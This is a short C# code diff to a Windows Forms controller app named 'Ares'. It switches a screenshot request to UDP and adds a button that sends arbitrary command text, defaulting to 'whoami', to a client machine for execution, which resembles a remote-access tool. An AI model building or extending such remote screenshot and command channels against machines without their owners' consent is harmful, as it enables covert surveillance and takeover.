@@ -6,6 +6,7 @@ using System.Drawing;
 using System.Linq;
 using System.Net;
 using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 
@@ -28,8 +29,29 @@ namespace Ares
 
         private void button1_Click(object sender, EventArgs e)
         {
-            Task.Run(()=>Client.Send("<SCREENSHOTREQ>"));
-            
+            UDPHeartBeat.Send("<SCREENSHOTREQ>", ClientIP);
+        }
+
+        
+
+        private void button2_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                if (ExecBox != null)
+                {
+                    UDPHeartBeat.Send("<EXECREQ> "+ExecBox.Text, ClientIP);
+                }
+                else
+                {
+                    UDPHeartBeat.Send("<EXECREQ> whoami", ClientIP);
+                }
+
+            }
+            catch(Exception ee)
+            {
+                Console.WriteLine(ee);
+            }
         }
     }
 }
